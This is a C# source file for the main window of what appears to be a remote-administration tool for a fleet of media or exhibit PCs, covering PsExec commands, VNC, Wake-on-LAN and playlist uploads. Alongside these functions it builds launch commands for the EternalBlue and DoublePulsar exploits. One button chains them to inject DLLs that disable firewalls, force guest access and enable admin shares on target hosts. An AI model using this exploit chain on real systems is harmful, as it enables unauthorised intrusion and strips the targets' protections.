using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using PsExec_Gui.lib;
using System.Windows.Forms;
using PsExec_Gui.Object;
using System.IO;
using log4net;
using System.Collections.ObjectModel;
using System.Text.RegularExpressions;

namespace PsExec_Gui
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public FileUtils fileutils = new FileUtils();
        List<LV_IP_Item> CSV = new List<LV_IP_Item>();
        string SelectBAT;
        CSVUtils CsvUtils;
        public ObservableCollection<LV_UPLOAD_Item> batchs = new ObservableCollection<LV_UPLOAD_Item>();
        ZkplayPlayList ZKPList;
        LV_IP_Item lv_ip_item;
        ZkplaySetting _ZkplaySetting;

        public MainWindow()
        {
            InitializeComponent();



            AppDomain currentDomain = default(AppDomain);
            currentDomain = AppDomain.CurrentDomain;
            // Handler for unhandled exceptions.
            currentDomain.UnhandledException += GlobalUnhandledExceptionHandler;
            // Handler for exceptions in threads behind forms.
            System.Windows.Forms.Application.ThreadException += GlobalThreadExceptionHandler;



            CsvUtils = new CSVUtils(this);



            //ConsoleManager initialize
            ConsoleManager.Toggle();
            Console.WriteLine("\"(HTTP)指令\"和\"永恒之蓝\"需关闭其他指令窗口(如CMD,VNC..).");



            TB_IP_FILE.Text = fileutils.path+@"\IP.csv";
            if (File.Exists(TB_IP_FILE.Text))
            {
                CSV=CsvUtils.Read(TB_IP_FILE.Text);
                LV_IP.ItemsSource = CSV;
                CsvUtils.Refresh(CSV);
            }



            Style itemContainerStyle = new Style(typeof(System.Windows.Controls.ListViewItem));
            itemContainerStyle.Setters.Add(new Setter(System.Windows.Controls.ListViewItem.AllowDropProperty, true));
            itemContainerStyle.Setters.Add(new EventSetter(System.Windows.Controls.ListViewItem.DropEvent, new System.Windows.DragEventHandler(Window_DragDrop)));
            LV_ZkplayPlayList.ItemContainerStyle = itemContainerStyle;
        }



        private void BTN_EXEC(object sender, RoutedEventArgs e)
        {
            ProgressBar.Value = 0;
            if ((string)LB_BAT_INNER.SelectedItem== "运行软件(前台)")
            {
                Schtasks schtasks = new Schtasks(this, fileutils, batchs);
                schtasks.Exec();
            }
            else {
                PsExec_Exec("EXEC");
            }
        }


        private void BTN_IP_BROWSER(object sender, EventArgs e)
        {
            BTN_Name_IP_ReFresh.IsEnabled = true;
            lib.OpenFileDialog _OpenFileDialog = new lib.OpenFileDialog("TB_IP");
            string[] filenames = (string[])_OpenFileDialog.Browser();
            if (filenames.Length>0)
            {
                TB_IP_FILE.Text = filenames[0];
                CSV = CsvUtils.Read(TB_IP_FILE.Text);
                LV_IP.ItemsSource = CSV;
                CsvUtils.Refresh(CSV);
                TB_Status_Change();
            }
        }



        /// <summary>
        /// 全选
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LV_IP_CheckBox_Select_All(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.CheckBox cb = sender as System.Windows.Controls.CheckBox;
            if (cb.IsChecked == true)
            {
                LV_IP.ItemsSource = CSV.Select(x => { x.IsChecked = true; return x; });
            }
            else
            {
                LV_IP.ItemsSource = CSV.Select(x => { x.IsChecked = false; return x; });
            }
            TB_Status_Change();
        }
        /// 由ChecBox的Click事件来记录被选中行的
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LV_IP_CheckBox_Click(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.CheckBox cb = sender as System.Windows.Controls.CheckBox;
            string tag = cb.Tag.ToString();
            LV_IP_Item Item = CSV.Find(x => x.IP == tag);
            if (cb.IsChecked == true)
            {
                Item.IsChecked = true;
            }
            else
            {
                Item.IsChecked = false;
            }
            TB_Status_Change();
        }



        private void Expand(object sender, RoutedEventArgs e)
        {
            System.Windows.Application.Current.MainWindow.Width = 930;

        }



        private void Collapse(object sender, RoutedEventArgs e)
        {
            System.Windows.Application.Current.MainWindow.Width = 750;

        }

        /// <summary>
        /// 全选
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LV_UPLOAD_CheckBox_Select_All(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.CheckBox cb = sender as System.Windows.Controls.CheckBox;
            if (cb.IsChecked == true)
            {
                LV_UPLOAD.ItemsSource = batchs.Select(x => { x.IsChecked = true; return x; });
            }
            else
            {
                LV_UPLOAD.ItemsSource = batchs.Select(x => { x.IsChecked = false; return x; });
            }
        }
        /// 由ChecBox的Click事件来记录被选中行的
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LV_UPLOAD_CheckBox_Click(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.CheckBox cb = sender as System.Windows.Controls.CheckBox;
            string tag = cb.Tag.ToString();
            LV_UPLOAD_Item Item = batchs.Single(x => x.Name == tag);
            if (cb.IsChecked == true)
            {
                Item.IsChecked = true;
            }
            else
            {
                Item.IsChecked = false;
            }
        }



        private void LB_BAT_SelectionChanged(object sender, EventArgs e)
        {
            System.Windows.Controls.ListBox lb = sender as System.Windows.Controls.ListBox;
            if (lb.SelectedItem != null)
            {
                string item = (string)lb.SelectedItem;
                TB_Batch_Descriptions.Text = "";
                if (LV_IP.SelectedItem != null) {
                    lv_ip_item = (LV_IP_Item)LV_IP.SelectedItem;
                }
                else
                {
                    LV_IP.SelectedIndex = 0;
                    lv_ip_item = (LV_IP_Item)LV_IP.SelectedItem;
                }
                string path ="";
                if (lb.Name == "LB_BAT_INNER") {
                    path = fileutils.BatInnerPath;
                }
                else if (lb.Name == "LB_BAT_CUSTOM") {
                    path = fileutils.BatCustomPath;
                }
                LV_Upload_Load lv_upload_load=new LV_Upload_Load(this, fileutils, batchs);
                lv_upload_load.Load(path + @"\" + item);
                TB_Batch_Destination.Text = lv_ip_item.Drive + @":\" + item + @"\";
                TB_Batch_IP.Text = lv_ip_item.IP;
                SelectBAT = item;
                TB_Status_Change();
                switch (item)
                {
                    case "PlusbeZkSet":
                        BTN_Name_PlusbeZkSet.Visibility = Visibility.Visible;
                        break;
                    case "VNC":
                        TB_Batch_Other.Text = "baidu.com";
                        break;
                    case "内容上传":
                        TB_Batch_Destination.Text = lv_ip_item.PlusbeZK;
                        break;
                    case "Zkplay设置":
                        BTN_Name_ZkplaySetting.Visibility = Visibility.Visible;
                        TB_Batch_Destination.Text = lv_ip_item.PlusbeZK;
                        break;
                    default:
                        BTN_Name_PlusbeZkSet.Visibility = Visibility.Hidden;
                        BTN_Name_ZkplaySetting.Visibility = Visibility.Hidden;
                        TB_Batch_Other.Text = lv_ip_item.Other;
                        break;
                }
            }
        }



        private void BTN_PlusbeZkSet(object sender, EventArgs e)
        {
            PlusbeZkSet _PlusbeZkSet = new PlusbeZkSet(fileutils);
            _PlusbeZkSet.Setting();
        }


        private void TB_Status_Change()
        {
            TB_Status.Text = "已选IP: "+CSV.Where(x => x.IsChecked == true).Count() + "/" + LV_IP.Items.Count+"; 已选批处理: "+SelectBAT;

        }



        private void BTN_IP_REFRESH(object sender, RoutedEventArgs e)
        {
            CsvUtils.Refresh(CSV);
        }



        private void BTN_PlusbeZk(object sender, RoutedEventArgs e)
        {
            LB_BAT_INNER.SelectedItem = "PlusbeZkOpen";
            LV_Upload_Load lv_upload_load = new LV_Upload_Load(this, fileutils, batchs);
            lv_upload_load.Load(fileutils.BatInnerPath + @"\"+ LB_BAT_INNER.SelectedItem);
            batchs = new ObservableCollection<LV_UPLOAD_Item>(LV_UPLOAD.ItemsSource.Cast< LV_UPLOAD_Item>());
            System.Windows.Controls.Button btn = sender as System.Windows.Controls.Button;
            PlusbeZk plusbezk = new PlusbeZk(this,fileutils,batchs);
            if (btn.Content.ToString().Contains("关"))
            {
                plusbezk.Close();
            }
            else if (btn.Content.ToString().Contains("开"))
            {
                plusbezk.Open();
            }
        }



        private static void GlobalUnhandledExceptionHandler(object sender, UnhandledExceptionEventArgs e)
        {
            Exception ex = default(Exception);
            ex = (Exception)e.ExceptionObject;
            ILog log = LogManager.GetLogger(typeof(MainWindow));
            log.Error(ex.Message + "\n" + ex.StackTrace);
        }



        private static void GlobalThreadExceptionHandler(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            Exception ex = default(Exception);
            ex = e.Exception;
            ILog log = LogManager.GetLogger(typeof(MainWindow)); //Log4NET
            log.Error(ex.Message + "\n" + ex.StackTrace);
        }



        public void PsExec_Exec(string trigger, bool sync=false)
        {
            IEnumerable<LV_IP_Item> targets = CSV.Where(x => x.IsChecked == true);
            if (targets.Count() != 0)
            {
                if (trigger == "WOL" || trigger == "PING") ProgressBar.Maximum = targets.Count();
                else ProgressBar.Maximum =targets.Where(x=>x.Online==true).Count();
                PsExec psexec = new PsExec(fileutils);
                PsShutdown psshutdown = new PsShutdown(fileutils);
                foreach (LV_IP_Item target in targets)
                {
                    if (target.IsChecked)
                    {
                        if (target.Online||trigger=="WOL"||trigger=="PING")
                        {
                            string batch = null;
                            URL_ShutdownAndMouse url_shutdownandmouse = new URL_ShutdownAndMouse(target.IP);
                            URL_Zkplay url_zkplay;
                            switch (trigger)
                            {
                                case "CMD":
                                    LV_UPLOAD.ItemsSource = null;
                                    batch = "start \"\" \"" + psexec.version + "\" \\\\" + target.IP + " -u " + target.User + " -p " + target.Passwd + " cmd";
                                    break;
                                case "EXEC":
                                    batch = "start /MIN \"\" \"" + psexec.version + "\" \\\\" + target.IP + " -u " + target.User + " -p " + target.Passwd + " -d cmd /c \"\"" + TB_Batch_Destination.Text + TB_Batch_ExecBat.Text + "\" \"" + TB_Batch_Destination.Text + "\" " + target.IP + " " + TB_Batch_Other.Text + "\"";
                                    break;
                                case "TASKKILL":
                                    batch = "start /MIN \"\" \"" + psexec.version + "\" \\\\" + target.IP + " -u " + target.User + " -p " + target.Passwd + " taskkill /F /IM " + TB_Batch_Other.Text;
                                    break;
                                case "MSTSC":
                                    batch = "mstsc /v:" + target.IP;
                                    break;
                                case "PING":
                                    batch = "start \"\" ping " + target.IP + " -t";
                                    break;
                                case "VNC":
                                    VNC vnc = new VNC(fileutils);
                                    if(TB_Batch_Other.Text!="baidu.com")fileutils.BinaryWrite(vnc.PasswdFilePath, StringExtensions.GetChunks(vnc.EncryptVNC(TB_Batch_Other.Text), 2));
                                    batch = "start \"\" \"" + vnc.SoftPath + "\" -passwd \"" + vnc.PasswdFilePath + "\" " + target.IP;
                                    break;
                                case "HTTP_SHUTDOWN":
                                    batch = url_shutdownandmouse.shutdown;
                                    break;
                                case "HTTP_RESTART":
                                    batch = url_shutdownandmouse.restart;
                                    break;
                                case "WOL":
                                    WOL wol = new WOL(fileutils);
                                    batch = "start /MIN \"\" \"" + wol.SoftPath + "\" " + target.Mac.Replace("-", "") + " " + target.IP + " 255.255.255.0 9";
                                    break;
                                case "EXPLORER":
                                    batch = @"start \\" + target.IP + @"\" + Regex.Replace(TB_Batch_Destination.Text, @":\\(资源管理器)?", @"$");
                                    break;
                                case "SHUTDOWN":
                                    batch = "start /MIN \"\" \"" + psshutdown.version + "\" -f -t 01 \\\\" + target.IP + " -u " + target.User + " -p " + target.Passwd;
                                    break;
                                case "RESTART":
                                    batch = "start /MIN \"\" \"" + psshutdown.version + "\" -r \\\\" + target.IP + " -u " + target.User + " -p " + target.Passwd;
                                    break;
                                case "EternalBlue":
                                    batch = "start /MIN \"\" \"" + fileutils.EquationExploitPath + "files\\Eternalblue-2.2.0.exe\" --InConfig \"" + fileutils.EquationExploitPath + "files\\Eternalblue-2.2.0.xml\" --TargetIp " + target.IP + " --TargetPort " + TB_TargetPort.Text + " --OutConfig \"" + fileutils.EquationExploitPath + @"logs\EB_" + target.IP + "_" + TB_TargetPort.Text + ".xml\"" + " --Target " + TB_TargetOS.Text;
                                    break;
                                case "DoublePulsar":
                                    batch = "start /MIN \"\" \"" + fileutils.EquationExploitPath + "files\\Doublepulsar-1.3.1.exe\" --InConfig \"" + fileutils.EquationExploitPath + "files\\Doublepulsar-1.3.1.xml\" --TargetIp " + target.IP + " --TargetPort " + TB_TargetPort.Text + " --OutConfig \"" + fileutils.EquationExploitPath + @"logs\DP_" + target.IP + "_" + TB_TargetPort.Text + ".xml\"" + " --Protocol " + TB_protocol.Text + " --Architecture " + TB_architecture.Text + " --Function " + LB_Function.SelectedItem.ToString() + " --DllPayload \"" + fileutils.EquationExploitDllsPath + LB_payloadDllname.SelectedItem.ToString() + "\" --payloadDllOrdinal " + TB_payloadDllOrdinal.Text + " --ProcessName " + LB_ProcessName.SelectedItem.ToString() + " --ProcessCommandLine " + TB_processCommandLine.Text + " --NetworkTimeout " + TB_NetworkTimeout.Text;
                                    break;
                                case "HTTP_ZKPLAY_RESTART":
                                    url_zkplay = new URL_Zkplay(target.IP);
                                    batch = url_zkplay.restart;
                                    break;
                                case "ZKPLAY_UPLOAD":
                                    LB_BAT_INNER.SelectedItem = "内容上传";
                                    if (!Regex.Match(lv_ip_item.PlusbeZK, "zkplay||内容").Success)
                                    {
                                        batch = "未指定Zkplay路径.";
                                    }
                                    else if (!File.Exists(TB_Batch_Other.Text.Split(';')[0]))
                                    {
                                        batch = "未指定上传文件.";
                                    }
                                    else
                                    {
                                        TB_Batch_Destination.Text = TB_Batch_Destination.Text + @"\UploadFiles";
                                        string[] FileList = target.Other.Split(';');
                                        ZkplayPlayList ZKPList = new ZkplayPlayList(this, target.IP);
                                        ZKPList.GetConfig();
                                        ZKPList.Add(FileList);
                                        batch = "PsExec_CopyOnly";
                                    }
                                    break;
                                case "HTTP_ZKPLAY_PLAY":
                                    url_zkplay = new URL_Zkplay(target.IP, LV_ZkplayPlayList.SelectedIndex);
                                    batch = url_zkplay.play;
                                    break;
                                case "HTTP_ZKPLAY_SETTING":
                                    _ZkplaySetting = new ZkplaySetting(this);
                                    _ZkplaySetting.Setting.myip = target.IP;
                                    url_zkplay = new URL_Zkplay(target.IP,0,_ZkplaySetting.Setting);
                                    batch = url_zkplay.setting_set;
                                    _ZkplaySetting.Close();
                                    break;
                                case "PsExec_CopyOnly":
                                    batch = "PsExec_CopyOnly";
                                    break;
                            }

                            if (sync)
                            {
                                batch = "SYNC_" + batch;
                            }
                            if (!batch.Contains("PsExec")) LV_UPLOAD.ItemsSource = null;
                            Thread thread = new Thread(this);
                            thread.Exec(target, batch);
                        }

                    }
                }
            }
        }



        private void BTN_Trigger(object sender, RoutedEventArgs e)
        {
            ProgressBar.Value = 0;
            string trigger = "";
            bool sync = false;
            System.Windows.Controls.Button btn = sender as System.Windows.Controls.Button;
            if (btn.Content.ToString().Contains("VNC")) { trigger = "VNC"; LB_BAT_INNER.SelectedItem = "VNC"; }
            else if (btn.Content.ToString().Contains("Ping")) trigger = "PING";
            else if (btn.Content.ToString().Contains("远程桌面")) trigger = "MSTSC";
            else if (btn.Content.ToString().Contains("CMD")) trigger = "CMD";
            else if (btn.Content.ToString().Contains("网络唤醒")) trigger = "WOL";
            else if (btn.Content.ToString().Contains("资源管理器")) { LB_BAT_INNER.SelectedItem = "资源管理器"; trigger = "EXPLORER"; }
            else if (btn.Content.ToString().Contains("重启(SMB)")) trigger = "RESTART";
            else if (btn.Content.ToString().Contains("关机(SMB)")) trigger = "SHUTDOWN";
            else if (btn.Content.ToString().Contains("重启(HTTP)")) { trigger = "HTTP_RESTART"; sync = true; }
            else if (btn.Content.ToString().Contains("关机(HTTP)")) { trigger = "HTTP_SHUTDOWN"; sync = true; }
            else if (btn.Content.ToString().Contains("关闭进程")) trigger = "TASKKILL";
            else if (btn.Name == "BTN_ZkplayRestart") { trigger = "HTTP_ZKPLAY_RESTART"; sync = true; }
            else if (btn.Name == "BTN_ZkplaySettingUpload") { trigger = "HTTP_ZKPLAY_SETTING"; sync = true; }
            else if (btn.Content.ToString().Contains("内容上传"))trigger = "ZKPLAY_UPLOAD";
            else if (btn.Name.ToString().Contains("EternalBlue")) trigger = "EternalBlue";
            else if (btn.Name.ToString().Contains("DoublePulsar")) trigger = "DoublePulsar";
            PsExec_Exec(trigger,sync);
        }



        public void PathCheck(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.TextBox tb = sender as System.Windows.Controls.TextBox;
            if (!Regex.Match(tb.Text, @"\\$").Success) tb.Text = tb.Text + @"\";
        }



        void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            LB_BAT_CUSTOM.ItemsSource = Batch.GetList(fileutils.BatCustomPath);
            LB_BAT_INNER.ItemsSource = Batch.GetList(fileutils.BatInnerPath).Concat((IEnumerable<string>)LB_BAT_CUSTOM.ItemsSource);
            LB_payloadDllname.ItemsSource=fileutils.searchFile(fileutils.EquationExploitDllsPath, "*.dll").Select(x=> System.IO.Path.GetFileName(x));
            LB_ProcessName.ItemsSource = new string[]{"svchost.exe","explorer.exe","lsass.exe" };
            LB_Function.ItemsSource = new string[] { "Ping", "Uninstall", "RunShellcode", "OutPutInstall", "RunDll" };
        }



        private void BTN_EquationExploit(object sender, RoutedEventArgs e)
        {
            ProgressBar.Value = 0;
            PsExec_Exec("EternalBlue");
            string[] dlls = {"x64LocalAccountTokenFilterPolicy.dll","x64LimitBlankPasswordUse.dll","x64ForceGuest.dll","x64FirewallProfilesOff.dll","x64AutoShareWks.dll","x64AutoShareServer.dll" };
            foreach(string dll in dlls)
            {
                //Console.WriteLine(dll);
                LB_payloadDllname.SelectedItem = dll;
                PsExec_Exec("DoublePulsar",true);
            }
        }



        void LV_IP_SelectionChanged(object sender, EventArgs e)
        {
            if (EXPD_Zkplay.IsExpanded)
            {
                LV_IP.ItemsSource = CSV.Select(x => { x.IsChecked = false; return x; });
                if (LV_IP.SelectedItem != null)
               {
                    lv_ip_item = (LV_IP_Item)LV_IP.SelectedItem;
                        if (lv_ip_item.Online)
                    {
                    if (!Regex.Match(lv_ip_item.PlusbeZK,"zkplay||内容").Success)
                        {
                            Console.WriteLine("未指定Zkplay路径.");
                        }
                    else
                        {
                            TB_CurrentIP.Text = lv_ip_item.IP;
                            ZKPList = new ZkplayPlayList(this, TB_CurrentIP.Text,lv_ip_item.PlusbeZK);
                            System.Threading.Thread thread = new System.Threading.Thread(delegate ()
                            {
                                ZKPList.GetConfig();
                                if(ZKPList.config != null)
                                {
                                Dispatcher.Invoke(() =>
                                {
                                    LV_ZkplayPlayList.ItemsSource = ZKPList.config.list;
                                });

                                }
                            });
                            thread.Start();

                        }
                    }
                }
            }
        }



        void EXPD_Zkplay_Expanded(object sender, EventArgs e)
        {
            if (EXPD_Zkplay.IsExpanded)
            {
                EXPD_Zkplay.Height = 266;

            }
            else
            {
                EXPD_Zkplay.Height = 23;

            }
        }


        void Zkplay_Play(object sender, EventArgs e)
        {
            CSV.Single(x => x.IP == ((LV_IP_Item)LV_IP.SelectedItem).IP).IsChecked = true;
            PsExec_Exec("HTTP_ZKPLAY_PLAY");
        }



        void MI_Trigger(object sender, EventArgs e)
        {
            if (TB_CurrentIP.Text != "TextBox")
            {
            System.Windows.Controls.MenuItem mi = sender as System.Windows.Controls.MenuItem;
            lv_ip_item = (LV_IP_Item)LV_IP.SelectedItem;
            //ZKPList = new ZkplayPlayList(this, lv_ip_item.IP, lv_ip_item.PlusbeZK);
            //ZKPList.GetConfig();
            switch (mi.Header.ToString())
            {
                case "播放":
                    Zkplay_Play( sender, e);
                    break;
                case "上传":
                    lib.OpenFileDialog _OpenFileDialog = new lib.OpenFileDialog("LV_ZkplayPlayList");
                    string[] filenames = (string[])_OpenFileDialog.Browser();
                    ZKPList.Add(filenames);
                    foreach (LV_IP_Item item in CSV)
                    {
                        item.IsChecked = false;
                    }
                    CSV.Single(x => x.IP == lv_ip_item.IP).IsChecked = true;
                    TB_Batch_Destination.Text = lv_ip_item.PlusbeZK + @"\UploadFiles\";
                    PsExec_Exec("PsExec_CopyOnly");
                    break;
                case "删除":
                    ZKPList.Del(LV_ZkplayPlayList.SelectedIndex);
                    break;
            }

            }
        }


        public void Window_DragDrop(object sender, System.Windows.DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(System.Windows.DataFormats.FileDrop);
            ZKPList.Add(files);
            lv_ip_item = (LV_IP_Item)LV_IP.SelectedItem;
            foreach(LV_IP_Item item in CSV)
            {
                item.IsChecked = false;
            }
            CSV.Single(x => x.IP == lv_ip_item.IP).IsChecked = true;
            TB_Batch_Destination.Text = lv_ip_item.PlusbeZK + @"\UploadFiles\";
            PsExec_Exec("PsExec_CopyOnly");
        }



        private void BTN_ZkplayListItemReorder(object sender, RoutedEventArgs e)
        {
            System.Windows.Controls.Button btn = sender as System.Windows.Controls.Button;
            ZkplayPlayList_Item Item = ZKPList.config.list.Find(x => x.Title == (string)btn.Tag);
            LV_ZkplayPlayList.SelectedItem = Item;
            if ((string)btn.Content == "↑")
            {
                if (LV_ZkplayPlayList.SelectedIndex != 0)
                {
                    ZKPList.config.list.RemoveAt(LV_ZkplayPlayList.SelectedIndex);
                    ZKPList.config.list.Insert(LV_ZkplayPlayList.SelectedIndex - 1, (ZkplayPlayList_Item)LV_ZkplayPlayList.SelectedItem);
                }
            }
            else if ((string)btn.Content == "↓")
            {
                if (LV_ZkplayPlayList.SelectedIndex != LV_ZkplayPlayList.Items.Count-1)
                {
                    ZKPList.config.list.RemoveAt(LV_ZkplayPlayList.SelectedIndex);
                    ZKPList.config.list.Insert(LV_ZkplayPlayList.SelectedIndex + 1, (ZkplayPlayList_Item)LV_ZkplayPlayList.SelectedItem);
                }
            }
            ZKPList.Save();
            LV_ZkplayPlayList.Items.Refresh();

        }



        private void BTN_ZkplaySetting(object sender, EventArgs e)
        {
            _ZkplaySetting = new ZkplaySetting(this);
            _ZkplaySetting.Show();
        }
    }
}
